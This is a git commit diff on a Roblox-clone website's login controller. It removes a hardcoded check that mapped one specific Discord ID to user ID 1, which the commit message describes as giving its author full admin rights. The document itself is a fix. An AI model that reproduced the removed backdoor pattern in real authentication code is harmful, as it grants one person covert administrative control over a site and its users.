a855e157c4547b10d946f001cfd13ee5c9372706
Unknown <unknownwasd5@gmail.com>
2026-02-15 18:19:46 +0300

    harry left his discord id in there
    basically gave himself full admin perms to the website lol

--- Roblox/Roblox.Website/Controllers/Internal/Other/Login.cs
+++ Roblox/Roblox.Website/Controllers/Internal/Other/Login.cs
@@ -506,19 +506,10 @@ namespace Roblox.Website.Controllers
 				var discordinfo = await httpClient.GetAsync("https://discord.com/api/users/@me");
 				var discordUser = await discordinfo.Content.ReadFromJsonAsync<DiscordUser>();
 
-				long ID;
-				// THIS IS TESTING. Remove in the future plz
-				if (discordUser.id == "713175126358884483")
+				long ID = await services.users.GetUserIdFromDiscordId(discordUser.id);
+				if (ID == 0)
 				{
-					ID = 1;
-				}
-				else
-				{
-					ID = await services.users.GetUserIdFromDiscordId(discordUser.id);
-					if (ID == 0)
-					{
-						return Redirect("/?loginmsg=There is no account linked to this Discord");
-					}
+					return Redirect("/?loginmsg=There is no account linked to this Discord");
 				}
 
 				var info = await services.users.GetUserById(ID);
